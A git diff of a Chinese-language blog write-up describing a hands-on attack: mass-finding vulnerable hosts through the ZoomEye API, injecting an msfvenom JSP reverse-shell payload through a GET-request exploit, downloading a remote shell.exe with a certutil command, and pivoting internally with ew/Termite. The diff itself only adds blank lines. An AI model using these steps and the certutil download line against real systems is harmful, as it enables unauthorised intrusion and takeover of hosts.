@@ -5,15 +5,23 @@
 ![](https://github.com/0linlin0/Records/blob/master/images/jb1.png?raw=true)
 原作者调用了zoomeye的api，然后构造exp，发送get请求，并验证在这里我们可以修改exp，我们强大的msf可以生成payload，用的是 payload/java/jsp_shell_reverse_tcp ，生成的代码不太多，因为漏洞利用的时候需要将代码url编码后放到get请求里，所以这里就悲催了，尽量压缩代码把。msf心比它提供的UIshell界面好用多了。谁让我java很烂呢:(
 生成payload并进行url编码，修改exp，然后运行修改后的脚本
+
 ![](https://github.com/0linlin0/Records/blob/master/images/jb2.png)
+
 得到存在漏洞的主机列表
+
 ![](https://github.com/0linlin0/Records/blob/master/images/jb3.png)
+
 
 Msf端设置监听端口，等待回连，访问链接，回连成功
 
+
 ![](https://github.com/0linlin0/Records/blob/master/images/jb4.png)
+
 Yes！拿到了webshell，我就想拿meterpreter，首先得上传payload，所以我又去搜，windows命令行下怎么样下载远程文件，得到了好多结果
+
 [http://www.4hou.com/system/8661.html](http://www.4hou.com/system/8661.html)
+
 [http://www.freebuf.com/articles/system/155147.html](http://www.freebuf.com/articles/system/155147.html) 
 [结果3](http://wps2015.org/drops/drops/%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%8415%E7%A7%8D%E6%96%B9%E6%B3%95.html)
 
@@ -27,7 +35,10 @@ certutil.exe -urlcache -split -f https：//a.com/shell.exe
 然后就进入到进入内网的问题了，ew人家更新了（http://rootkiter.com/Termite/）看了人家的视频，真的是好好用，我太菜了，一直不成功，是不是Termite只支持正向socks..应该不会吧，所以只能先用着ew了。。。伤心当中。
 关于Termite的使用不成功
 
+
 ![](https://github.com/0linlin0/Records/blob/master/images/jb5.png)
 
+
 上传成功后msf监听端口，等待回连，回连成功
+
 ![](https://github.com/0linlin0/Records/blob/master/images/jb6.png)
